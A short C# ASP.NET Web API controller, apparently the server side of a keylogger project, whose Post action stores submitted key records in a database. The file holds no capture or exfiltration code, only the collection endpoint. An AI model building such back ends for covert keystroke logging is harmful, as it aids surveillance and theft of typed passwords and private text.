using KeyLogger.Models;
using System.Web.Http;

namespace KeyLogger.Controllers
{
    public class KeyController : ApiController
    {
        public IHttpActionResult Post(Key key)
        {
            using (KeyDBEntities keyDB = new KeyDBEntities())
            {
                keyDB.Keys.Add(key);
                keyDB.SaveChanges();
            }

            return Ok();
        }
    }
}
